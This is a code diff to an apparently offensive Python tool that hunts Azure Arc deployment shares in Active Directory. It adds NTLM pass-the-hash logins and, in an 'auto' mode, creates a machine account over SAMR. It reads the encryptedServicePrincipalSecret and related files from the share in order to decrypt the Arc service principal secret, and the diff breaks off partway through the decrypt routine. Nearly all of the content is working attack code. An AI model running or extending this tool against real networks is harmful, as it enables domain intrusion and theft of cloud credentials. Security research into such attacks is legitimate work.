@@ -11,6 +11,7 @@ import re
 import socket
 import string
 import sys
+import traceback
 
 try:
     from ldap3 import Server, Connection, ALL, NTLM, SUBTREE
@@ -24,6 +25,12 @@ try:
 except ImportError:
     HAS_IMPACKET = False
 
+try:
+    import dns.resolver
+    HAS_DNS = True
+except ImportError:
+    HAS_DNS = False
+
 ARC_FILE_INDICATORS = [
     "encryptedServicePrincipalSecret",
     "ArcInfo.json",
@@ -31,6 +38,36 @@ ARC_FILE_INDICATORS = [
     "EnableAzureArc.ps1",
 ]
 ARC_GPO_KEYWORDS = ["azure arc", "azurearc", "arc server", "arc onboard"]
+
+_NTLM_HASH_RE = re.compile(r'^(?:[a-fA-F0-9]{32}:)?[a-fA-F0-9]{32}$')
+_DUMMY_LM = "aad3b435b51404eeaad3b435b51404ee"
+
+
+def _split_hash(password):
+    """If password is 'LM:NT' or bare 'NT' (hex), return (lm_hex, nt_hex). Else (None, None)."""
+    if password and _NTLM_HASH_RE.match(password):
+        if ':' in password:
+            lm, nt = password.split(':', 1)
+        else:
+            lm, nt = _DUMMY_LM, password
+        return lm, nt
+    return None, None
+
+
+def _normalize_hash(h):
+    """Normalize a hash to 'LM:NT' format so ldap3 and spnego auto-detect it.
+
+    Both libraries only recognize 'LM:NT' (32:32 hex with colon) — a bare NT
+    hash (32 hex, no colon) is treated as a plaintext password. impacket's
+    _split_hash handles both, but the raw password string flows unmodified
+    to ldap3/spnego, so we normalize here.
+    """
+    if not h:
+        return ""
+    if ':' not in h and re.match(r'^[a-fA-F0-9]{32}$', h):
+        return f"{_DUMMY_LM}:{h}"
+    return h
+
 
 YELLOW = "\033[93m"
 GREEN  = "\033[92m"
@@ -79,19 +116,26 @@ def smb_connect(hostname, domain, username, password, fallback_ip=None):
 
     for target in targets:
         try:
+            dbg("SMB", _info, f"Connecting to {target} (remoteName={hostname}) ...")
             smb = SMBConnection(hostname, target, timeout=5)
             if username and password:
-                smb.login(username, password, domain)
+                lm, nt = _split_hash(password)
+                if lm:
+                    dbg("SMB", _info, f"Authenticating as {domain}\\{username} with NTLM hash")
+                    smb.login(username, "", domain, lmhash=lm, nthash=nt)
+                else:
+                    dbg("SMB", _info, f"Authenticating as {domain}\\{username} with password")
+                    smb.login(username, password, domain)
             else:
+                dbg("SMB", _info, "Authenticating with null/kerberos session")
                 try:
                     smb.kerberosLogin("", "", domain)
                 except Exception:
                     smb.login("", "")
+            dbg("SMB", _good, f"Connected to {target}")
             return smb
         except Exception as e:
-            if CONFIG["verbose"]:
-                print(f"  [DEBUG] smb_connect failed for target {target}: {e}")
-            pass
+            dbg("SMB", _bad, f"Connection to {target} failed: {e}")
     return None
 
 
@@ -124,6 +168,140 @@ def _walk_sysvol(smb, guid, gpo_base=None, base_share="SYSVOL"):
     _recurse(root)
     print()
 
+def _ldap_connect(dc, domain, username, password, prefix="LDAP"):
+    """Bind to LDAP on dc as domain\\username (NTLM) or GSSAPI (null creds).
+
+    Returns a Connection or None on bind failure (caller handles return).
+    """
+    srv = Server(dc, get_info=ALL, connect_timeout=5)
+    try:
+        if username and password:
+            dbg(prefix, _info, f"Binding as {domain}\\{username} (NTLM)")
+            return Connection(
+                srv,
+                user=f"{domain}\\{username}",
+                password=password,
+                authentication=NTLM,
+                auto_bind=True,
+                auto_referrals=False,
+            )
+        dbg(prefix, _info, "Binding with GSSAPI")
+        return Connection(srv, authentication="GSSAPI",
+                          auto_bind=True, auto_referrals=False)
+    except Exception as e:
+        pline(prefix, _bad, f"LDAP bind failed: {e}")
+        return None
+
+
+def enumerate_dcs(dc, domain, username, password):
+    """
+    Query LDAP for all Domain Controller hostnames in the domain.
+    Falls back to [dc] on any failure.
+    """
+    if not HAS_LDAP3:
+        dbg("LDAP", _warn, "ldap3 not installed - cannot enumerate DCs")
+        return [dc]
+
+    base_dn = "DC=" + domain.replace(".", ",DC=")
+    dbg("LDAP", _info, f"Enumerating DCs via LDAP ({dc}) ...")
+    conn = _ldap_connect(dc, domain, username, password, prefix="LDAP")
+    if conn is None:
+        return [dc]
+
+    dc_list = []
+    conn.search(
+        f"OU=Domain Controllers,{base_dn}",
+        "(objectClass=computer)",
+        search_scope=SUBTREE,
+        attributes=["dNSHostName"],
+    )
+    for entry in conn.entries:
+        dc_list.append(str(entry.dNSHostName))
+    conn.unbind()
+
+    if not dc_list:
+        pline("LDAP", _warn, f"No DCs found via LDAP - using {dc}")
+        return [dc]
+    dbg("LDAP", _good, f"Found {len(dc_list)} DC(s): {', '.join(dc_list)}")
+    return dc_list
+
+
+# SYSVOL files we look for, in order, under each GPO base directory.
+_SYSVOL_CANDIDATE_PATHS = [
+    "Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
+    "Machine\\Scripts\\scripts.ini",
+    "Machine\\Scripts\\Startup\\EnableAzureArc.ps1",
+    "GPT.INI",
+]
+
+
+def _share_entry(server, share, unc, report_server, share_name):
+    """Build a share-info dict (see check_gpo_and_sysvol return shape)."""
+    return {
+        "server":        server,
+        "share":         share,
+        "unc":           unc,
+        "report_server": report_server,
+        "share_name":    share_name,
+    }
+
+
+def _read_sysvol_file(smb, gpo_base):
+    """Try candidate SYSVOL paths under gpo_base; return first readable file's
+    decoded content, or None if none could be read."""
+    for suffix in _SYSVOL_CANDIDATE_PATHS:
+        candidate = f"{gpo_base}\\{suffix}"
+        try:
+            dbg("GPO", _info, f"Trying SYSVOL path: {candidate}")
+            buf = io.BytesIO()
+            smb.getFile("SYSVOL", candidate, buf.write)
+            content = buf.getvalue().decode("utf-8", errors="ignore")
+            dbg("GPO", _good, f"Read {len(content)} bytes from {candidate}")
+            return content
+        except Exception:
+            pass
+    return None
+
+
+def _extract_shares_from_xml(xml_content, extracted_shares):
+    """Parse share references from a GPO XML/ini file; append any new shares
+    to `extracted_shares` (a dict keyed by lowercased UNC, deduped in place)."""
+    dbg("GPO", _info, "Parsing XML for share references ...")
+    unc_matches = re.findall(
+        r"['\"]?(\\\\[^\\]+\\[^\\\s'\"<&]+)['\"]?",
+        xml_content,
+    )
+    report_server = (re.findall(r"-ReportServerFQDN\s+([^\s'\"<&]+)", xml_content) or [""])[0]
+    share_name    = (re.findall(r"-ArcRemoteShare\s+['\"]?([^\s'\"<&]+)", xml_content) or [""])[0]
+
+    for unc in unc_matches:
+        # extract server and first share component from UNC
+        parts = unc.lstrip("\\").split("\\")
+        if len(parts) >= 2:
+            srv_name, share_part = parts[0], parts[1]
+            clean_unc = f"\\\\{srv_name}\\{share_part}"
+            if clean_unc.lower() not in extracted_shares:
+                extracted_shares[clean_unc.lower()] = _share_entry(
+                    srv_name, share_part, clean_unc,
+                    report_server or srv_name, share_name or share_part,
+                )
+                pline("GPO", _good, f"Share extracted from SYSVOL XML: {clean_unc}")
+            break  # one per GPO is enough
+
+    # BUG: `not extracted_shares` checks the global dict accumulated across all
+    # GPOs, not whether *this* GPO matched the UNC regex above. If GPO #1
+    # matched via the regex, GPO #2's -ReportServerFQDN fallback never fires.
+    # Should be a per-GPO flag (e.g. `if not gpo_found_share and ...`).
+    if not extracted_shares and report_server and share_name:
+        clean_unc = f"\\\\{report_server}\\{share_name}"
+        if clean_unc.lower() not in extracted_shares:
+            extracted_shares[clean_unc.lower()] = _share_entry(
+                report_server, share_name, clean_unc,
+                report_server, share_name,
+            )
+            pline("GPO", _good, f"Share extracted from SYSVOL XML (-ArcRemoteShare): {clean_unc}")
+
+
 def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
     """
     1. LDAP - find Arc onboarding GPO, get its SYSVOL path and GUID
@@ -141,25 +319,13 @@ def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
         return gpos, dc_list, extracted_shares
 
     base_dn = "DC=" + domain.replace(".", ",DC=")
-    srv = Server(dc, get_info=ALL, connect_timeout=5)
-    try:
-        if username and password:
-            conn = Connection(
-                srv,
-                user=f"{domain}\\{username}",
-                password=password,
-                authentication=NTLM,
-                auto_bind=True,
-                auto_referrals=False,
-            )
-        else:
-            conn = Connection(srv, authentication="GSSAPI",
-                              auto_bind=True, auto_referrals=False)
-    except Exception as e:
-        pline("GPO", _bad, f"LDAP bind failed: {e}")
+    dbg("GPO", _info, f"LDAP base DN: {base_dn}")
+    conn = _ldap_connect(dc, domain, username, password, prefix="GPO")
+    if conn is None:
         return gpos, dc_list, extracted_shares
 
     # GPO search
+    dbg("GPO", _info, f"Searching for Arc GPOs in CN=Policies,CN=System,{base_dn} ...")
     ok = conn.search(
         f"CN=Policies,CN=System,{base_dn}",
         "(objectClass=groupPolicyContainer)",
@@ -183,11 +349,14 @@ def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
             })
             pline("GPO", _good, f"Arc GPO found: {raw_name}")
             print(f"       {DIM}* SYSVOL: {sysvol_path}{RESET}")
+        else:
+            dbg("GPO", _info, f"Skipping non-Arc GPO: {raw_name}")
 
     if not gpos:
         pline("GPO", _bad, "No Arc-related GPOs found in LDAP")
 
     # Get DCs
+    dbg("GPO", _info, "Enumerating Domain Controllers ...")
     conn.search(
         f"OU=Domain Controllers,{base_dn}",
         "(objectClass=computer)",
@@ -197,6 +366,7 @@ def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
     for entry in conn.entries:
         dc_list.append(str(entry.dNSHostName))
     conn.unbind()
+    dbg("GPO", _good, f"Found {len(dc_list)} DC(s): {', '.join(dc_list) if dc_list else 'none'}")
 
     if not gpos:
         return gpos, dc_list, extracted_shares
@@ -206,7 +376,9 @@ def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
         pline("GPO", _warn, "impacket not installed - cannot read SYSVOL over SMB")
         return gpos, dc_list, extracted_shares
 
-    smb = smb_connect(dc_list[0] if dc_list else dc, domain, username, password,
+    sysvol_dc = dc_list[0] if dc_list else dc
+    dbg("GPO", _info, f"Reading SYSVOL from {sysvol_dc} over SMB ...")
+    smb = smb_connect(sysvol_dc, domain, username, password,
                       fallback_ip=dc)
     if smb is None:
         pline("GPO", _warn, "Could not connect to DC over SMB to read SYSVOL")
@@ -219,75 +391,21 @@ def check_gpo_and_sysvol(dc, domain, username, password, debug_sysvol=False):
             pline("GPO", _warn, f"Could not extract GUID from SYSVOL path: {sysvol}")
             continue
         guid = guid_match.group(0)
+        dbg("GPO", _info, f"Processing GPO {guid} ...")
 
-        # We extract everything after "\sysvol\" as the prefix.
-        sysvol_inner = re.sub(r"^\\\\[^\\]+\\sysvol\\", "", sysvol, flags=re.IGNORECASE)
-        gpo_base = sysvol_inner
+        # everything after "\sysvol\" is the GPO base path on the share
+        gpo_base = re.sub(r"^\\\\[^\\]+\\sysvol\\", "", sysvol, flags=re.IGNORECASE)
 
-        candidate_paths = [
-            f"{gpo_base}\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml",
-            f"{gpo_base}\\Machine\\Scripts\\scripts.ini",
-            f"{gpo_base}\\Machine\\Scripts\\Startup\\EnableAzureArc.ps1",
-            f"{gpo_base}\\GPT.INI",
-        ]
-
-        xml_content = None
-        for candidate in candidate_paths:
-            try:
-                buf = io.BytesIO()
-                smb.getFile("SYSVOL", candidate, buf.write)
-                xml_content = buf.getvalue().decode("utf-8", errors="ignore")
-                break
-            except Exception:
-                pass
-
+        xml_content = _read_sysvol_file(smb, gpo_base)
         if xml_content is None:
             pline("GPO", _warn, f"Could not find task XML in SYSVOL for GPO {guid}")
             if debug_sysvol:
-                _walk_sysvol(smb, guid, gpo_base=sysvol_inner)
+                _walk_sysvol(smb, guid, gpo_base=gpo_base)
             else:
                 pline("GPO", _warn, "Run with --debug-sysvol to see full GPO directory tree")
             continue
 
-        # parse the XML for share info
-        # full UNC from Copy-Item (most reliable)
-        unc_matches = re.findall(
-            r"['\"]?(\\\\[^\\]+\\[^\\\s'\"<&]+)['\"]?",
-            xml_content
-        )
-        report_server = (re.findall(r"-ReportServerFQDN\s+([^\s'\"<&]+)", xml_content) or [""])[0]
-        share_name    = (re.findall(r"-ArcRemoteShare\s+['\"]?([^\s'\"<&]+)", xml_content) or [""])[0]
-
-        for unc in unc_matches:
-            # extract server and first share component from UNC
-            parts = unc.lstrip("\\").split("\\")
-            if len(parts) >= 2:
-                srv_name   = parts[0]
-                share_part = parts[1]
-                clean_unc  = f"\\\\{srv_name}\\{share_part}"
-                if clean_unc.lower() not in extracted_shares:
-                    extracted_shares[clean_unc.lower()] = {
-                        "server":        srv_name,
-                        "share":         share_part,
-                        "unc":           clean_unc,
-                        "report_server": report_server or srv_name,
-                        "share_name":    share_name or share_part,
-                    }
-                    pline("GPO", _good, f"Share extracted from SYSVOL XML: {clean_unc}")
-                break  # one per GPO is enough
-
-        # if UNC regex missed it, fall back to -ReportServerFQDN + -ArcRemoteShare
-        if not extracted_shares and report_server and share_name:
-            clean_unc = f"\\\\{report_server}\\{share_name}"
-            if clean_unc.lower() not in extracted_shares:
-                extracted_shares[clean_unc.lower()] = {
-                    "server":        report_server,
-                    "share":         share_name,
-                    "unc":           clean_unc,
-                    "report_server": report_server,
-                    "share_name":    share_name,
-                }
-                pline("GPO", _good, f"Share extracted from SYSVOL XML (-ArcRemoteShare): {clean_unc}")
+        _extract_shares_from_xml(xml_content, extracted_shares)
 
     smb.logoff()
     return gpos, dc_list, list(extracted_shares.values())
@@ -303,6 +421,7 @@ def check_share(share_info, domain, username, password, fallback_ip=None):
     share_name = share_info["share"]
     unc        = share_info["unc"]
 
+    dbg("SMB", _info, f"Probing share {unc} ...")
     smb = smb_connect(server, domain, username, password, fallback_ip=fallback_ip)
     if smb is None:
         # if server FQDN doesn't resolve, try fallback IP with server name for NTLM
@@ -327,10 +446,14 @@ def check_share(share_info, domain, username, password, fallback_ip=None):
                     "indicators": indicators,
                     "all_files":  names,
                 })
+            if indicators:
+                dbg("SMB", _good, f"Arc indicators found in {sub or 'root'}: {', '.join(indicators)}")
+            elif names:
+                dbg("SMB", _info, f"No Arc indicators in {sub or 'root'} ({len(names)} files)")
         except Exception as e:
             if "STATUS_ACCESS_DENIED" in str(e):
                 detail["access_denied"] = True
-            pass
+                dbg("SMB", _warn, f"Access denied listing {sub or 'root'}")
 
     smb.logoff()
     # return detail even if empty - share was found, just may be unreadable
@@ -348,7 +471,9 @@ def check_smb_shares_fallback(dc_list, domain, username, password, fallback_ip=N
     found_shares  = []
     share_details = []
 
+    dbg("SMB", _info, f"Scanning {len(dc_list)} DC(s) for Arc shares ...")
     for dc in dc_list:
+        dbg("SMB", _info, f"Connecting to {dc} ...")
         smb = smb_connect(dc, domain, username, password, fallback_ip=fallback_ip)
         if smb is None:
             pline("SMB", _bad, f"Could not connect to {dc}")
@@ -360,6 +485,8 @@ def check_smb_shares_fallback(dc_list, domain, username, password, fallback_ip=N
             pline("SMB", _bad, f"Could not list shares on {dc}: {e}")
             smb.logoff()
             continue
+
+        dbg("SMB", _info, f"{dc} has {len(shares)} share(s) - checking keywords ...")
 
         for share in shares:
             name = share["shi1_netname"].rstrip("\x00")
@@ -383,12 +510,19 @@ def check_smb_shares_fallback(dc_list, domain, username, password, fallback_ip=N
 
 def resolve_dc(domain):
     try:
+        dbg("DNS", _info, f"Resolving DC for {domain} ...")
         ip = socket.gethostbyname(domain)
+        if not HAS_DNS:
+            dbg("DNS", _warn, f"SRV lookup failed - using A record {ip}")
+            return ip
+        dbg("DNS", _info, f"Querying SRV _ldap._tcp.dc._msdcs.{domain} ...")
         try:
-            import dns.resolver
-            ans  = dns.resolver.resolve(f"_ldap._tcp.dc._msdcs.{domain}", "SRV")
-            return str(ans[0].target).rstrip(".")
+            ans = dns.resolver.resolve(f"_ldap._tcp.dc._msdcs.{domain}", "SRV")
+            dc = str(ans[0].target).rstrip(".")
+            dbg("DNS", _good, f"SRV resolved to {dc}")
+            return dc
         except Exception:
+            dbg("DNS", _warn, f"SRV lookup failed - using A record {ip}")
             return ip
     except Exception:
         return None
@@ -405,10 +539,15 @@ def main():
                         help="Domain FQDN e.g. contoso.local")
     parent.add_argument("-dc-ip", metavar="DC",       default="",
                         help="DC FQDN or IP (e.g. DC01.contoso.local or 10.0.0.1)")
-    parent.add_argument("-u",     metavar="USERNAME", default="", 
+    parent.add_argument("-u",     metavar="USERNAME", default="",
                         help="Domain user (or machine account for decrypt)")
-    parent.add_argument("-p",     metavar="PASSWORD", default="", 
-                        help="Password")
+    _auth_grp = parent.add_mutually_exclusive_group(required=False)
+    _auth_grp.add_argument("-p", metavar="PASSWORD", default="",
+                           help="Password")
+    _auth_grp.add_argument("-H", "-hash", dest="hash", metavar="LM:NT", default="",
+                           help="NTLM hash (LM:NT or bare NT hex)")
+    parent.add_argument("-v", "-verbose", dest="verbose", action="store_true",
+                        help="Show every step in detail")
 
     sub = parser.add_subparsers(dest="command", metavar="COMMAND")
     sub.required = True
@@ -416,6 +555,10 @@ def main():
     p_find = sub.add_parser("find", parents=[parent], help="Detect Arc GPO and deployment share")
     p_find.add_argument("-debug-sysvol", action="store_true",
                         help="Walk and print the full GPO SYSVOL directory tree")
+    p_find.add_argument("--gpo", action="store_true",
+                        help="Only use GPO/SYSVOL detection")
+    p_find.add_argument("--smb", action="store_true",
+                        help="Only use SMB keyword share enumeration")
 
     p_dec = sub.add_parser(
         "decrypt",
@@ -424,8 +567,10 @@ def main():
         formatter_class=argparse.RawDescriptionHelpFormatter,
         description="""
 Auth modes (pick one):
-  -auto -u USER -p PASS    Create a temp machine account using domain user creds
-  -u MACHINE$ -p PASS      Explicit machine account credentials (NTLM)
+  -auto -u USER -p PASS     Create a temp machine account using domain user creds
+  -auto -u USER -H LM:NT    Same, authenticating with an NTLM hash
+  -u MACHINE$ -p PASS       Explicit machine account credentials (NTLM)
+  -u MACHINE$ -H LM:NT      Same, authenticating with an NTLM hash
 
 If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
         """
@@ -440,10 +585,10 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
 
     p_dec.add_argument("-dump-blob", metavar="PATH",
                        help="Save the decoded blob to PATH for offline analysis")
-    p_dec.add_argument("-v", "-verbose", dest="verbose", action="store_true",
-                       help="Show blob internals, the DpapiNgUtil source, and per-recipient detail")
 
     args = parser.parse_args()
+
+    CONFIG["verbose"] = getattr(args, "verbose", False)
 
     if args.command == "decrypt":
         cmd_decrypt(args)
@@ -464,7 +609,7 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
             sys.exit(1)
 
     username = args.u
-    password = args.p
+    password = args.p or _normalize_hash(args.hash)
 
     print(f"  {_info(f'Domain : {domain}')}")
     print(f"  {_info(f'DC     : {dc}')}")
@@ -473,32 +618,54 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
     arc_in_use    = False
     share_details = []
     extracted     = []   # shares parsed from SYSVOL
+    gpos          = []
+    dc_list       = []
+
+    use_gpo  = getattr(args, "gpo", False)
+    use_smb  = getattr(args, "smb", False)
+    auto_mode = not use_gpo and not use_smb
+
+    if auto_mode:
+        dbg("FIND", _info, "Discovery mode: auto (GPO first, SMB fallback)")
+    elif use_gpo and use_smb:
+        dbg("FIND", _info, "Discovery mode: both (GPO + SMB independently)")
+    elif use_gpo:
+        dbg("FIND", _info, "Discovery mode: GPO only")
+    elif use_smb:
+        dbg("FIND", _info, "Discovery mode: SMB only")
 
     # 1. GPO + SYSVOL parse
-    debug_sysvol = getattr(args, "debug_sysvol", False)
-    gpos, dc_list, extracted = check_gpo_and_sysvol(
-        dc, domain, username or None, password or None,
-        debug_sysvol=debug_sysvol
-    )
-    if gpos:
-        arc_in_use = True
+    if use_gpo or auto_mode:
+        section("GPO Detection")
+        debug_sysvol = getattr(args, "debug_sysvol", False)
+        gpos, dc_list, extracted = check_gpo_and_sysvol(
+            dc, domain, username or None, password or None,
+            debug_sysvol=debug_sysvol
+        )
+        if gpos:
+            arc_in_use = True
 
-    # 2a. Probe shares identified from SYSVOL XML (precise)
-    if extracted:
-        for share_info in extracted:
-            detail = check_share(
-                share_info, domain, username or None, password or None,
-                fallback_ip=dc
-            )
-            if detail is not None:
-                arc_in_use = True
-                share_details.append(detail)
+        # Probe shares identified from SYSVOL XML (precise)
+        if extracted:
+            section("Share Probe")
+            dbg("FIND", _info, f"Probing {len(extracted)} share(s) from GPO ...")
+            for share_info in extracted:
+                detail = check_share(
+                    share_info, domain, username or None, password or None,
+                    fallback_ip=dc
+                )
+                if detail is not None:
+                    arc_in_use = True
+                    share_details.append(detail)
 
-    # 2b. Keyword-based share hunt - only if GPO SYSVOL parse found nothing.
-    # If we already have a share from the GPO, we know exactly where it is.
-    if not extracted and HAS_IMPACKET:
+    # 2. Keyword-based share hunt
+    #    auto_mode: only if GPO SYSVOL parse found nothing (current fallback)
+    #    use_smb:   always (explicitly requested)
+    if (use_smb or (auto_mode and not extracted)) and HAS_IMPACKET:
+        section("SMB Share Scan")
         if not dc_list:
-            dc_list = [dc]
+            dbg("SMB", _info, "No DC list yet - enumerating via LDAP ...")
+            dc_list = enumerate_dcs(dc, domain, username or None, password or None)
         _, fb_details = check_smb_shares_fallback(
             dc_list, domain, username or None, password or None, fallback_ip=dc
         )
@@ -538,8 +705,6 @@ If -share is omitted, the Arc share is auto-discovered via GPO/SYSVOL.
                     print(f"\n    {_info(sub['path'])}")
                     for f in sub["all_files"]:
                         print(f"      {DIM}{f}{RESET}")
-
-
 
     print()
 
@@ -606,14 +771,23 @@ def _create_machine_account(domain, dc, user_username, user_password, machine_na
     pline("AUTO", _info, f"Creating machine account ...")
 
     string_binding = f"ncacn_np:{dc}[\\pipe\\samr]"
+    dbg("AUTO", _info, f"SAMR binding: {string_binding}")
     rpctransport = transport.DCERPCTransportFactory(string_binding)
-    rpctransport.set_credentials(user_username, user_password, domain, "", "", None)
+    lm, nt = _split_hash(user_password)
+    if lm:
+        dbg("AUTO", _info, f"Authenticating as {domain}\\{user_username} with NTLM hash")
+        rpctransport.set_credentials(user_username, "", domain, lm, nt, "", None)
+    else:
+        dbg("AUTO", _info, f"Authenticating as {domain}\\{user_username} with password")
+        rpctransport.set_credentials(user_username, user_password, domain, "", "", None)
     dce = rpctransport.get_dce_rpc()
     dce.connect()
     dce.bind(samr.MSRPC_UUID_SAMR)
+    dbg("AUTO", _good, "SAMR connected and bound")
 
     resp         = samr.hSamrConnect(dce)
     server_handle = resp["ServerHandle"]
+    dbg("AUTO", _info, "SamrConnect OK")
 
     # find the domain (exclude BUILTIN)
     resp2 = samr.hSamrEnumerateDomainsInSamServer(dce, server_handle)
@@ -623,8 +797,11 @@ def _create_machine_account(domain, dc, user_username, user_password, machine_na
     )
     resp3        = samr.hSamrLookupDomainInSamServer(dce, server_handle, domain_name)
     domain_sid   = resp3["DomainId"]
-    resp4        = samr.hSamrOpenDomain(dce, server_handle, domainId=domain_sid)
+    resp4        = samr.hSamrOpenDomain(dce, server_handle,
+                                       samr.DOMAIN_LOOKUP | samr.DOMAIN_CREATE_USER,
+                                       domainId=domain_sid)
     domain_handle = resp4["DomainHandle"]
+    dbg("AUTO", _info, f"Domain: {domain_name} (SID: {domain_sid.formatCanonical()})")
 
     resp5 = samr.hSamrCreateUser2InDomain(
         dce, domain_handle, machine_name,
@@ -632,9 +809,11 @@ def _create_machine_account(domain, dc, user_username, user_password, machine_na
         samr.USER_FORCE_PASSWORD_CHANGE,
     )
     user_handle = resp5["UserHandle"]
+    dbg("AUTO", _good, f"Created account {machine_name}")
 
-    samr.hSamrSetNTInternal1(dce, user_handle, machine_pass)
-    
+    samr.hSamrSetPasswordInternal4New(dce, user_handle, machine_pass)
+    dbg("AUTO", _info, "Machine password set")
+
     checkForUser = samr.hSamrLookupNamesInDomain(dce, domain_handle, [machine_name])
     user_rid = checkForUser['RelativeIds']['Element'][0]
     openUser = samr.hSamrOpenUser(dce, domain_handle, samr.MAXIMUM_ALLOWED, user_rid)
@@ -655,9 +834,6 @@ def _create_machine_account(domain, dc, user_username, user_password, machine_na
     pline("AUTO", _good, f"Machine account created: {machine_name}")
     pline("AUTO", _good, f"Machine account password: {machine_pass}")
     return machine_name, machine_pass
-
-
-
 
 
 def decode_pwsh_bytes(raw: bytes) -> str:
@@ -690,6 +866,7 @@ def _read_share_files(smb, share_name):
             if already[var] is not None:
                 continue
             try:
+                dbg("SMB", _info, f"Trying {prefix}{fname} ...")
                 buf = io.BytesIO()
                 smb.getFile(share_name, f"{prefix}{fname}", buf.write)
                 raw = buf.getvalue()
@@ -698,8 +875,10 @@ def _read_share_files(smb, share_name):
                     pline("SMB", _good, f"Read encryptedServicePrincipalSecret ({subdir or 'root'})")
                 elif var == "arcinfo":
                     arcinfo_str = decode_pwsh_bytes(raw)
+                    dbg("SMB", _good, f"Read ArcInfo.json ({subdir or 'root'}) - {len(raw)} bytes")
                 else:
                     psm1_str = decode_pwsh_bytes(raw)
+                    dbg("SMB", _good, f"Read AzureArcDeployment.psm1 ({subdir or 'root'}) - {len(raw)} bytes")
             except Exception:
                 pass
 
@@ -794,6 +973,7 @@ def _discover_share(dc, domain, username, password):
     Reuse the `find` GPO/SYSVOL logic to locate the Arc deployment share UNC.
     Returns the chosen share UNC string, or None if nothing was found.
     """
+    dbg("FIND", _info, "Auto-discovering share via GPO/SYSVOL ...")
     _, _, extracted = check_gpo_and_sysvol(dc, domain, username, password)
 
     # dedupe by UNC - multiple GPOs may point at the same share
@@ -805,10 +985,46 @@ def _discover_share(dc, domain, username, password):
             uniq.append(s)
 
     if not uniq:
+        dbg("FIND", _bad, "No shares found via GPO discovery")
         return None
     if len(uniq) > 1:
         pline("FIND", _warn, f"{len(uniq)} shares found - using first")
+    dbg("FIND", _good, f"Using share: {uniq[0]['unc']}")
     return uniq[0]["unc"]
+
+
+def _print_psm1_excerpt(psm1_str):
+    """Print the DpapiNgUtil class excerpt (or relevant API lines) from the .psm1."""
+    section("AzureArcDeployment.psm1 - DpapiNgUtil")
+    lines = psm1_str.splitlines()
+    start = next((i for i, l in enumerate(lines)
+                  if "DpapiNgUtil" in l or ("Add-Type" in l and "DpapiNg" in l)), None)
+    if start is not None:
+        # show up to 200 lines from the class definition
+        for line in lines[start:start + 200]:
+            print(f"  {DIM}{line}{RESET}")
+    else:
+        # fallback: show every line that mentions a relevant API
+        keywords = ("DpapiNg", "NCrypt", "Unprotect", "Protect", "ProtectedData",
+                    "DllImport", "DataProtect", "AesKw", "KeyWrap")
+        hits = [l for l in lines if any(kw in l for kw in keywords)]
+        for line in hits[:60]:
+            print(f"  {DIM}{line}{RESET}")
+    print()
+
+
+def _decode_secret_blob(raw):
+    """Try base64, hex, then raw decoding of `raw`. Returns blob bytes or None."""
+    for strategy, fn in [
+        ("base64", lambda r: base64.b64decode(r)),
+        ("hex",    lambda r: bytes.fromhex(r.decode("ascii", errors="ignore").strip())),
+        ("raw",    lambda r: r),
+    ]:
+        with contextlib.suppress(Exception):
+            blob = fn(raw)
+            dbg("DEC", _good, f"Decoded blob ({len(blob)} bytes, {strategy})")
+            return blob
+    return None
 
 
 def cmd_decrypt(args):
@@ -834,14 +1050,12 @@ def cmd_decrypt(args):
     share_unc = args.share
     auto      = getattr(args, "auto", False)
     username  = getattr(args, "u", "") or ""
-    password  = getattr(args, "p", "") or ""
+    password  = getattr(args, "p", "") or _normalize_hash(getattr(args, "hash", "")) or ""
 
     # validate: need exactly one auth mode
     if not auto and not username:
-        print(_bad("Specify an auth mode: -auto -u <domain_user> -p <pass>  |  -u <MACHINE$> -p <pass>"))
+        print(_bad("Specify an auth mode: -auto -u <domain_user> -p <pass>|-H <hash>  |  -u <MACHINE$> -p <pass>|-H <hash>"))
         sys.exit(1)
-
-    CONFIG["verbose"] = getattr(args, "verbose", False)
 
     banner()
     print(f"  {_info(f'Domain : {domain}')}")
@@ -875,6 +1089,7 @@ def cmd_decrypt(args):
         if not share_unc:
             print(_bad("Could not auto-discover an Arc share - pass -share <UNC> explicitly"))
             sys.exit(1)
+        print(f"  {_info(f'Share  : {share_unc}')}")
         print()
 
     # parse share UNC
@@ -884,6 +1099,7 @@ def cmd_decrypt(args):
         sys.exit(1)
     share_server = parts[0]
     share_name   = parts[1]
+    dbg("DEC", _info, f"Share server: {share_server}, share name: {share_name}")
 
     # create machine account
     machine_user = None
@@ -892,18 +1108,22 @@ def cmd_decrypt(args):
 
     if auto:
         if not username or not password:
-            print(_bad("-auto requires -u <domain_user> -p <password>"))
+            print(_bad("-auto requires -u <domain_user> -p <password>|-H <hash>"))
             sys.exit(1)
+        dbg("DEC", _info, "Auto mode: creating temp machine account ...")
         try:
             machine_user, machine_pass = _create_machine_account(
                 domain, dc, username, password
             )
             cleanup_account = True
         except Exception as e:
-            print(_bad(f"Failed to create machine account: {e}"))
+            print(_bad(f"Failed to create machine account: {repr(e)}"))
+            if CONFIG["verbose"]:
+                traceback.print_exc()
             print(_warn("Check Machine Account Quota (ms-DS-MachineAccountQuota) and user permissions"))
             sys.exit(1)
     else:
+        dbg("DEC", _info, f"Using explicit machine account: {domain}\\{username}")
         machine_user = username
         machine_pass = password
 
@@ -920,26 +1140,14 @@ def cmd_decrypt(args):
             print(_bad(f"Could not connect to {share_server}"))
             sys.exit(1)
 
+        dbg("DEC", _info, "Reading deployment files from share ...")
         secret_raw, arcinfo_raw, psm1_str = _read_share_files(smb, share_name)
         smb.logoff()
+        dbg("DEC", _info, f"Share read complete: secret={'yes' if secret_raw else 'no'}, "
+                          f"arcinfo={'yes' if arcinfo_raw else 'no'}, psm1={'yes' if psm1_str else 'no'}")
 
         if psm1_str and CONFIG["verbose"]:
-            section("AzureArcDeployment.psm1 - DpapiNgUtil")
-            lines = psm1_str.splitlines()
-            start = next((i for i, l in enumerate(lines)
-                          if "DpapiNgUtil" in l or ("Add-Type" in l and "DpapiNg" in l)), None)
-            if start is not None:
-                # show up to 200 lines from the class definition
